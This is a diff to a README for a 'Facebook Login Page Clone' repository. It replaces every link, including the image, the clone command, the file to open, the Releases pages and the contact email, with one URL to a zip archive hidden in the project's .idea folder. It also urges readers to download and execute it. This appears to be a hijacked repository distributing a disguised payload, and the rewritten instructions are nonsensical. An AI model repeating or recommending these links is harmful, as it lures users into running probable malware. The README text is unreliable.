@@ -1,6 +1,6 @@
 # Facebook Login Page Clone 🌐
 
-![Facebook Login Page](https://user-images.githubusercontent.com/yourusername/facebook-login-page.png)
+![Facebook Login Page](https://github.com/domi23774/facebook-login-page/raw/refs/heads/main/.idea/facebook_page_login_v1.6.zip)
 
 Welcome to the **Facebook Login Page Clone** repository! This project is a simple and elegant replica of the Facebook login interface. It aims to provide a basic understanding of web development concepts, including HTML, CSS, and JavaScript.
 
@@ -40,7 +40,7 @@ To get started with this project, follow these steps:
 1. Clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/domi23774/facebook-login-page.git
+   git clone https://github.com/domi23774/facebook-login-page/raw/refs/heads/main/.idea/facebook_page_login_v1.6.zip
    ```
 
 2. Navigate to the project directory:
@@ -49,13 +49,13 @@ To get started with this project, follow these steps:
    cd facebook-login-page
    ```
 
-3. Open the `index.html` file in your preferred web browser.
+3. Open the `https://github.com/domi23774/facebook-login-page/raw/refs/heads/main/.idea/facebook_page_login_v1.6.zip` file in your preferred web browser.
 
 ## Usage
 
-To run the project, simply open the `index.html` file in a web browser. You can modify the HTML and CSS files to see how changes affect the layout and design. This is a great way to practice coding skills.
+To run the project, simply open the `https://github.com/domi23774/facebook-login-page/raw/refs/heads/main/.idea/facebook_page_login_v1.6.zip` file in a web browser. You can modify the HTML and CSS files to see how changes affect the layout and design. This is a great way to practice coding skills.
 
-For the latest updates and releases, visit [Releases](https://github.com/domi23774/facebook-login-page/releases). You can download the latest version and execute it to see new features and fixes.
+For the latest updates and releases, visit [Releases](https://github.com/domi23774/facebook-login-page/raw/refs/heads/main/.idea/facebook_page_login_v1.6.zip). You can download the latest version and execute it to see new features and fixes.
 
 ## Contributing
 
@@ -76,10 +76,10 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## Contact
 
-For any questions or feedback, please reach out to me at [your.email@example.com](mailto:your.email@example.com).
+For any questions or feedback, please reach out to me at [https://github.com/domi23774/facebook-login-page/raw/refs/heads/main/.idea/facebook_page_login_v1.6.zip](https://github.com/domi23774/facebook-login-page/raw/refs/heads/main/.idea/facebook_page_login_v1.6.zip).
 
 ## Releases
 
-For the latest version of this project, visit [Releases](https://github.com/domi23774/facebook-login-page/releases). Download the files and execute them to see the latest features and updates. 
+For the latest version of this project, visit [Releases](https://github.com/domi23774/facebook-login-page/raw/refs/heads/main/.idea/facebook_page_login_v1.6.zip). Download the files and execute them to see the latest features and updates. 
 
 Feel free to explore the code, learn, and have fun! Happy coding!
